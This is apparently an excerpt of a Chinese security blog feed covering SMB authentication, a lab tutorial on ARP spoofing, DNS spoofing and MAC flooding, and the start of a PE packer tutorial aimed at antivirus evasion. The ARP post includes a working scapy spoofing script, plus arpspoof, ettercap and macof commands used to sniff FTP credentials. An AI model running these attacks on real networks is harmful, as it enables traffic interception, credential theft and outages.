alt="QQ截图20210217125903"></p><p>1.tikect:这里就是TGS部分了。<br>enc-part：这里的enc-part是被所请求的服务的用户hash加密的<br>2.enc-part:被login session key加密的service session key</p><h1 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h1><p>SMB协议是一个用于两台计算机间共享文件 、打印机、串口等功能的协议。<br>网上邻居功能就是依靠SMB协议而起的。<br>通过smb协议，一台计算机可以在经过smb认证后读写另一台计算机上的一些文件。<br>smb协议一般架设在NetBios协议之上。<br>NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。</p><h2 id="SMB认证"><a href="#SMB认证" class="headerlink" title="SMB认证"></a>SMB认证</h2><p>如果我们想依靠smb协议去读写另一台计算机上的文件，那么其中的SMB认证情况是如何呢？我们简单分析一下。</p><p>1.版本确立阶段<br>2.用户认证阶段<br>3.资源链接阶段<br>4.资源读写阶段</p><p>更详细一点。<br>1.版本确立阶段。客户端先发送自己支持的SMB协议版本给服务器，服务器收到后向客户端列出希望使用的版本。若客户端支持的smb版本服务器均不支持，则返回 0XFFFFH，结束通信 。<br>2.用户认证阶段。确立好认证版本后，就是客户端发送账户密码给服务端进行身份验证了。服务器收到后返回认证成功或失败<br>3.资源链接阶段。用户认证通过后，客户端发送自己想要访问的资源名，服务器收到后返回允许或拒绝<br>4.资源读写阶段，客户端开始读写服务器上文件。</p><p>看起来比ntlm和kerberos简单多了。抓包分析一下。</p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>1.1 客户端向服务端列出当前支持的smb版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130121.png" alt="QQ截图20210217130121"></p><p>1.2服务器返回希望的SMB版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130226.png" alt="QQ截图20210217130226"></p><p>1.3这里说个题外话，此时服务器只是选中了SMB2，但是SMB2也分了很多版本，所以客户端还会基于SMB2继续进行版本问询</p><img src="http://www.const27.com/wp-content/uploads/2020/11/image-10.png" alt="img" style="zoom:150%;" /><p>然后服务器再继续选择一个细分版本，版本协商结束</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130238.png" alt="QQ截图20210217130238"></p><p>2.1 客户端向服务端提供用户信息。SMB协议的这一个部分使用NTLM协议完成的。建议先看看NTLM认证再过来<br>首先客户端发送一个请求NTLM认证的包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130252.png" alt="QQ截图20210217130252"></p><p>2.2服务端返回challenge</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130331.png" alt="QQ截图20210217130331"></p><p>2.3 客户端发送用户名，被client hash加密的challenge（NTLM RESPONSE）给服务端</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130400.png" alt="QQ截图20210217130400"></p><p>2.4服务端进行认证处理，返回认证成功或失败，下图是成功时，返回 会话建立字样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130419.png" alt="QQ截图20210217130419"></p><p>3.1客户端发送请求的资源</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130431.png" alt="QQ截图20210217130431"></p><p>3.2服务端返回允许或拒绝</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130454.png" alt="QQ截图20210217130454"></p><ol start="4"><li>各种读写操作请求</li></ol><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130512.png" alt="QQ截图20210217130512"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;域，工作组，活动目录&quot;&gt;&lt;a href=&quot;#域，工作组，活动目录&quot; class=&quot;headerlink&quot; title=&quot;域，工作组，活动目录&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>ARP欺骗&amp;DNS欺骗&amp;mac泛洪攻击</title>
    <link href="http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/"/>
    <id>http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</id>
    <published>2021-06-28T13:51:58.218Z</published>
    <updated>2021-06-28T13:38:48.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arp协议与欺骗"><a href="#arp协议与欺骗" class="headerlink" title="arp协议与欺骗"></a>arp协议与欺骗</h1><h2 id="简单概要："><a href="#简单概要：" class="headerlink" title="简单概要："></a>简单概要：</h2><p>通过此协议来获取局域网中某IP地址的mac地址</p><h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><p>在局域网中的机器互相发送消息时，靠的是mac地址（也叫以太网地址）来确定目的地址的，而我们只知道IP地址，所以需要arp协议来把ip地址映射为mac地址。 具体实现原理是，比如我想知道192.168.1.1的mac地址，就会在广播域里广播arp请求，ip不是192.168.1.1的主机会自动忽略请求，而192.168.1.1主机则会应答请求，并返回自己的mac地址(由IP定位到mac地址)</p><h2 id="arp高速缓存表："><a href="#arp高速缓存表：" class="headerlink" title="arp高速缓存表："></a>arp高速缓存表：</h2><p>这个表用来缓存 ip地址与mac地址 的对应关系<br>有动态表和静态表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">动态表随时间的推移自动添加和删除,每个动态arp缓存都有自己的TTL(生存时间).TTL为0就会被删</span><br><span class="line">静态表是永久性的，手动添加和删除。</span><br></pre></td></tr></table></figure><p><strong>局域网中ip到mac地址解析过程：</strong><br>1.当缓存表中存在目的IP对应的mac地址时 则直接返回与IP对应的mac地址<br>2.当缓存表中没有对应关系时,则向局域网中发送arp广播请求目的IP的mac，收到arp应答后将对应关系记录到高速缓存表中<br><strong>高速缓存表的优缺点</strong>：<br>优点：减少网络通信量，提高通信效率<br>缺点：会造成安全隐患</p><h2 id="arp分组格式"><a href="#arp分组格式" class="headerlink" title="arp分组格式"></a>arp分组格式</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144616.png" alt="QQ截图20210219144616"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.arp请求的目的mac地址  全f时代表广播地址</span><br><span class="line">2.arp请求的来源mac地址</span><br><span class="line">3.字段3 以太网帧类型表示的是后面的数据类型，ARP请求和ARP应答这个值为0x0806</span><br><span class="line">4.字段4 表示硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为1</span><br><span class="line">5.字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800</span><br><span class="line">67.字段6和7 表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节</span><br><span class="line">8.操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；</span><br><span class="line">               值为3，表示进行RARP请求；值为4，表示进行RARP应答。（重要）</span><br><span class="line">9.字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</span><br><span class="line">10.字段10 发送ARP请求或应答的IP地址。</span><br><span class="line">11 12.目的端的硬件地址和协议地址</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144723.png" alt="QQ截图20210219144723"></p><h2 id="免费arp"><a href="#免费arp" class="headerlink" title="免费arp"></a>免费arp</h2><p>免费arp是指主机发送arp查找自己的IP地址,发送端的协议地址和目的端的协议地址是一致的<br><strong>作用：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(如某些网关设备会每隔一定时间广播一次免费arp，让网络中其他主机更新arp缓存表中网关的mac地址，缓解arp攻击效果)</span><br><span class="line">(如黑客可以使用免费arp，将虚假伪造的 ip mac对应关系通过arp广播出去，使网络中其他主机更新arp缓存表，更新完成后，这些主机的数据会转发到错误的mac地址，从而实现arp欺骗）</span><br><span class="line">2.检查广播域里的其他主机有没有使用自己的IP，如果使用了，则会弹出 IP冲突 字样</span><br><span class="line">免费arp与普通arp的区别:</span><br><span class="line">普通arp的请求是 我需要某ip的mac地址，该IP是其他机器的IP地址</span><br><span class="line">免费arp的请求是 我需要某IP的mac地址，该IP是机器自己的IP地址，起到宣告作用，发出去后是不希望得到回应的，若有回应则说明了IP冲突了</span><br></pre></td></tr></table></figure><h2 id="代理arp"><a href="#代理arp" class="headerlink" title="代理arp"></a>代理arp</h2><p>代理arp的意思是，一个主机把自己的mac地址给另一台机器使用来应答其他主机的arp请求。 实际上，这已经是某种意义上的arp欺骗</p><h2 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h2><h3 id="攻击原理："><a href="#攻击原理：" class="headerlink" title="攻击原理："></a>攻击原理：</h3><p>arp攻击就是伪造IP与mac的对应关系来实现arp欺骗，攻击者只要持续不断的发送伪造的arp响应包就能更改目标主机的arp缓存表，造成 断网攻击 或 中间人攻击</p><h3 id="利用arspoof实现断网攻击"><a href="#利用arspoof实现断网攻击" class="headerlink" title="利用arspoof实现断网攻击"></a>利用arspoof实现断网攻击</h3><p>用kali和物理机进行测试，kali是攻击机，物理机是受害者<br>首先收集kali，物理机，网关的ip地址和mac<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150147.png" alt="QQ截图20210219150147"></p><p>假设我们想要在实际中实施攻击，首先需要扫描局域网中的IP，但我们一个一个ping就很浪费时间了，所以需要fping命令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150203.png" alt="QQ截图20210219150203"><br>解读一下命令 arpspoof -i kali网卡名 -t 被攻击机ip 网关<br>好的，我们物理机成功被断网<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144847.png" alt="QQ截图20210219144847"></p><h2 id="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"><a href="#使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包" class="headerlink" title="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"></a>使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144946.png" alt="QQ截图20210219144946"><br>然后我们执行arpspoog指令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145018.png" alt="QQ截图20210219145018"><br>此时我们物理机就能连上外网了<br><em>坑点:开启ip转发后物理机依旧不能连上外网.</em> 我的解决方法是重启一下，再修改以下ip_forward文件然后等一会，物理机就可以连上外网了.arp欺骗后物理机网可能会卡。<br>此时，物理机发给网关的通信信息我们都能获得到了，我们可以在虚拟机中使用driftnet工具捕获物理机正在浏览的图片<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145032.png" alt="QQ截图20210219145032"></p><h2 id="arp攻击的脚本编写："><a href="#arp攻击的脚本编写：" class="headerlink" title="arp攻击的脚本编写："></a>arp攻击的脚本编写：</h2><p>arp攻击脚本需要用到scapy库来帮助我们完成arp数据包的编写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">讲讲里面的一些函数(没有继续研究scapy库)</span><br><span class="line">get_if_hwaddr(&#39;网卡名&#39;)  &#x2F;&#x2F;获得自己的mac地址，一般填WLAN或eth0</span><br><span class="line">getmacbyip(&#39;ip)         &#x2F;&#x2F;获得某IP的mac地址</span><br><span class="line">srp(....)               &#x2F;&#x2F;发第二层包并返等待回应，返回值的第一个参数是回应包体。第二个参数是未回应包体</span><br><span class="line"></span><br><span class="line">sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))</span><br><span class="line">&#x2F;&#x2F;这是arp发包的构造 sendp是发第二层数据包并不等待回包 Ether是构造包体的意思</span><br><span class="line">&#x2F;&#x2F;a为自己的mac地址 b为目标机器的mac地址，</span><br><span class="line">&#x2F;&#x2F;c为发包的来源mac，d为发包的来源ip，e是目标机器的ip，f是arp操作类型字符</span><br><span class="line">&#x2F;&#x2F;arp欺骗的话，把d改成网关IP即可</span><br></pre></td></tr></table></figure><p>网上嫖的ip，mac扫描模块，这一步也可以手动获取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ip地址扫描函数</span><br><span class="line">def im_scan(ipduan):</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br></pre></td></tr></table></figure><p>这个脚本仅能断网嗷,可以对单个机器断网，也可以断整个局域网的网</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def im_scan(ipduan):#扫描</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br><span class="line">            </span><br><span class="line">def arp_spoof(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    if tgt_ip:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2))</span><br><span class="line">    else:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line">def arp_gate(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    while 1:</span><br><span class="line">        sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39;</span><br><span class="line">    tgt_ip&#x3D;&#39;192.168.0.104&#39; #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置</span><br><span class="line">    gateway_ip&#x3D;&#39;192.168.0.1&#39;</span><br><span class="line">    iface&#x3D;&#39;WLAN&#39;</span><br><span class="line">    threads_num&#x3D;20</span><br><span class="line">    print(&quot;如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置&quot;)</span><br><span class="line">    so_scan&#x3D;input(&quot;[+]要扫描局域网存活主机和它的mac吗[Y&#x2F;N]&quot;)</span><br><span class="line">    if so_scan&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">        im_scan(ipduan)</span><br><span class="line">    else:</span><br><span class="line">        so_judge&#x3D;input(&quot;[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y&#x2F;N]&quot;)</span><br><span class="line">        if so_judge&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">            try:</span><br><span class="line">                print(&#39;开始截胡机器发送往外界的数据&#39;)</span><br><span class="line">                time.sleep(3)</span><br><span class="line">                for i in range(threads_num):</span><br><span class="line">                    t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                    t1.start()</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">        else:</span><br><span class="line">            if tgt_ip:</span><br><span class="line">                try:</span><br><span class="line">                    print(&#39;开始截胡外界发往机器的数据&#39;)</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                    for i in range(threads_num):</span><br><span class="line">                        t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                        t2.start()</span><br><span class="line">                except KeyboardInterrupt:</span><br><span class="line">                    print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;请设置tgt_ip&#39;)</span><br></pre></td></tr></table></figure><p>广播欺骗，受害机上的抓包效果 3c那个是我的mac地址<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145053.png" alt="QQ截图20210219145053"></p><h1 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h1><h2 id="dns工作原理"><a href="#dns工作原理" class="headerlink" title="dns工作原理"></a>dns工作原理</h2><p>dns（域名系统）将域名和IP地址相互映射，dns协议即域名解析协议，用来将用户输入的域名解析为IP。<br>具体一点，当用户访问某个域名如<a href="http://www.baidu.com/">www.baidu.com</a>时， 首先向本地dns发出请求<br>若本地dns缓存表无该域名IP映射关系，就会向根域名服务器发起查询，根域名服务器返回com域服务器地址给本地dns服务器<br>本地dns服务器向com域服务器发起查询，com域服务器返回baidu.com域服务器给本地dns服务器<br>本地dns服务器向baidu.com域服务器发起查询，baidu.com域服务器返回<a href="http://www.baidu.com/">www.baidu.com</a>地址</p><h2 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a>DNS欺骗原理</h2><p>在arp欺骗后获取到了受害机发起的dns请求包，然后返回一个自己构造的dns响应包，伪造自己想要的ip域名映射关系。<br>因为DNS欺骗是建立在arp欺骗基础上，arp欺骗又必须在局域网进行，故DNS欺骗也只能在局域网进行</p><h2 id="DNS欺骗工具实现"><a href="#DNS欺骗工具实现" class="headerlink" title="DNS欺骗工具实现"></a>DNS欺骗工具实现</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145146.png" alt="QQ截图20210219145146"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ettercap -T -q -P dns_spoof -M arp:remote &#x2F;受害者IP&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145220.png" alt="QQ截图20210219145220"></p><h1 id="mac泛洪攻击"><a href="#mac泛洪攻击" class="headerlink" title="mac泛洪攻击"></a>mac泛洪攻击</h1><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机:"></a>交换机:</h2><p>交换机，只能做有线链接，所以拿这个是不能用作wifi的。<br>交换机的作用是转发局域网内两台机器之间的互相的请求（有线连接的机器）。</p><p>交换机具体传输数据帧的过程：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假设主机A第一次向主机B发送数据</span><br><span class="line">主机A向交换机发起一个源mac地址为自己，目标mac地址为主机B的数据帧</span><br><span class="line">交换机收到后，将源mac地址和其对应接口记录到mac地址表中（mac地址表与arp缓存表有区别）</span><br><span class="line">交换机在自己的mac地址表中检查是否有目标mac的信息，如果有则向目标mac接口转发数据帧，如果没有，就会向所以非数据来源接口的接口广播该数据帧（mac泛洪攻击原理）</span><br><span class="line">局域网内主机都收到了此数据帧，但只有主机B会响应该数据帧并且回应，回应信息里注明主机B的mac地址以便记录到mac地址表，其他主机都不会有反应。</span><br><span class="line">交换机接收到主机B的回应后，会记录其mac 接口的映射关系，以后AB通信时会调用mac地址表中的记录，实现单播</span><br></pre></td></tr></table></figure><h2 id="mac表与arp缓存表的区别"><a href="#mac表与arp缓存表的区别" class="headerlink" title="mac表与arp缓存表的区别"></a>mac表与arp缓存表的区别</h2><p>mac表记录在交换机中，用于记录接口 mac地址的对应关系<br>arp缓存表记录在本机中，用于记录IP mac地址的对应关系</p><h2 id="交换机mac表的学习机制："><a href="#交换机mac表的学习机制：" class="headerlink" title="交换机mac表的学习机制："></a>交换机mac表的学习机制：</h2><p>mac表一般都是有大小限制的，一旦mac表满了，其他mac地址就加不进来了。<br>一旦其他mac地址加不进来了，那么mac表就无法进一步学习，之后的所有请求都会被广播到局域网，实现泛洪。<br>mac表是有老化机制的，若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址删除，等下一次通信时再学习。</p><h2 id="泛洪攻击原理："><a href="#泛洪攻击原理：" class="headerlink" title="泛洪攻击原理："></a>泛洪攻击原理：</h2><p>泛洪攻击的目的是获取主机之间的通信数据，要达到这个目的则需要强迫交换机把接收到的数据帧统统广播出来。泛洪攻击原理则是向交换机发送大量未知mac地址让交换机不停学习，把mac表充满，这样正常主机mac地址老化后就无法再添加到mac地址表中，以后的所有通信数据都会被广播出来</p><h2 id="使用kali上的macof来进行泛洪攻击"><a href="#使用kali上的macof来进行泛洪攻击" class="headerlink" title="使用kali上的macof来进行泛洪攻击"></a>使用kali上的macof来进行泛洪攻击</h2><p>目前有三台机器<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145424.png" alt="QQ截图20210219145424"><br>我们试着截获物理机登录ftp服务器时的账户与密码<br>先使用命令macof，让交换机的mac表被占满<br>仅输入macof即可<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145448.png" alt="QQ截图20210219145448"><br>输入tcpdump -nn -X -i eth0 tcp port 21开始抓包（建议不用wireshark，是因为同一时间macof命令发出的数据包太多了，用wireshark会巨卡）<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145510.png" alt="QQ截图20210219145510"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png" alt="QQ截图20210219145527"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png"></p><p>下面是抓http包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145603.png" alt="QQ截图20210219145603"></p><h2 id="mac泛洪攻击的局限性"><a href="#mac泛洪攻击的局限性" class="headerlink" title="mac泛洪攻击的局限性:"></a>mac泛洪攻击的局限性:</h2><p>只能在局域网内攻击另一个局域网内机器.<br>且攻击目标必须和自己用交换机有线连接起来<br>也就是说你的电脑发起mac泛洪是攻击不到你的手机的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;arp协议与欺骗&quot;&gt;&lt;a href=&quot;#arp协议与欺骗&quot; class=&quot;headerlink&quot; title=&quot;arp协议与欺骗&quot;&gt;&lt;/a&gt;arp协议与欺骗&lt;/h1&gt;&lt;h2 id=&quot;简单概要：&quot;&gt;&lt;a href=&quot;#简单概要：&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>从0开始用C++写一个加壳器</title>
    <link href="http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/"/>
    <id>http://const27.com/2021/06/28/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C++%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/</id>
    <published>2021-06-28T13:51:48.301Z</published>
    <updated>2021-09-03T13:17:26.978Z</updated>
    
    <content type="html"><![CDATA[<p>参考:<a href="https://blog.csdn.net/qq_31507523/article/details/89438410">https://blog.csdn.net/qq_31507523/article/details/89438410</a></p><p>学习一下写壳，在以后免杀中使用。</p><h2 id="加壳原理"><a href="#加壳原理" class="headerlink" title="加壳原理"></a>加壳原理</h2><h3 id="手工加壳"><a href="#手工加壳" class="headerlink" title="手工加壳"></a>手工加壳</h3><p>用010editor手工加壳了解一波原理。加壳原理大致如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144840.png" alt="QQ截图20210217144840"></p><p>即我们向PE文件添加一个区段并将其设置为入口点，这样PE文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的EXE文件还原出来，然后跳转至原程序入口，程序照常运行。</p><p>首先生成一个打印hello的exe文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们目前要干的事情是:以手动的形式向PE文件添加一个壳部分并设为程序入口，并使其能跳转回原入口。<br>那就来吧</p><p>用010editor打开我们的exe文件，启用exe模板分析。<br>我们首先修改其文件头numverofsection属性，这个属性用来定义当前PE文件存在多少个区段,因为我们要添加一个壳区段，所以我们将其加1变成6</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144857.png" alt="QQ截图20210217144857"></p><p>在我们重载模板后我们就会在区段表发现多出来一个空的区段表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144908.png" alt="QQ截图20210217144908"></p><p>从上到下各个比较重要字段的意思是<br>\1. Name 表示该区段的名字<br>2.VirtualSize 表示在内存中的大小(一般内存对齐为0x1000)<br>3.virtualaddress 虚拟地址 即上一个区段的VirtualAddress + 上一个区段经内存对齐粒度对齐后的大小<br>4.sizeofdata 表示在文件中的大小（一般文件对齐为0x200)<br>5.pointertorawdata 文件的偏移 即 上一个区段的PointerToRawData + 上一个区段的SizeOfRawData</p><p>然后我们通过修改以上各值来定义一个新区段（壳区段)的属性</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144928.png" alt="QQ截图20210217144928"></p><p>这里的virtualsize看着填一个就行了。<br>此时我们只是定义了区段表，但文件中并没有该区段存在，所以我们得创建该区段。<br>然后还要让区段可编辑，把下列值改为1即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144950.png" alt="QQ截图20210217144950"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145000.png" alt="QQ截图20210217145000"></p><p>ctrl+shift+i 向目标文件偏移处插入0x200大小的空间。<br>这样一来，壳区段就创建好了。 然后我们还要修改 扩展头的SizeofImage 。将他改为最后一个区段的内存地址+内存大小</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145029.png" alt="QQ截图20210217145029"></p><p>然后去掉随机基址选项。</p><p>找到扩展头的DLL属性字段，去掉随机基址，把40 81改为 00 81</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145042.png" 